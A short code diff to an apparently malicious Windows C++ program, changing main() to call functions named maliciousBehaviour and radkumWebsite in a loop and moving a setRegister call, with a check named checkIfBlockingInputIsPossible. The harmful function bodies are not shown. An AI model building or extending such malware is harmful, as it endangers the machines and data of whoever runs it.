@@ -26,17 +26,17 @@ int main()
 
     for(size_t i = 0; i < LOOP_NUMBER; i++)
     {
-        ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)radkumWebsite, NULL, 0, NULL);
+        radkumWebsite();
        
         //sleep 2 seconds
         ::Sleep(2000);
 
-        ::CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)maliciousBehaviour, NULL, 0, NULL);
+        maliciousBehaviour();
 
         //sleep 2 seconds
         ::Sleep(2000);
     }
-
+    setRegister();
     return 0;
 }
 void maliciousBehaviour() {
@@ -90,7 +90,6 @@ bool checkIfBlockingInputIsPossible() {
 }
 
 void setRegister() {
-    setRegister();
     char system[MAX_PATH];
     char windows[MAX_PATH];
     char pathtofile[MAX_PATH];
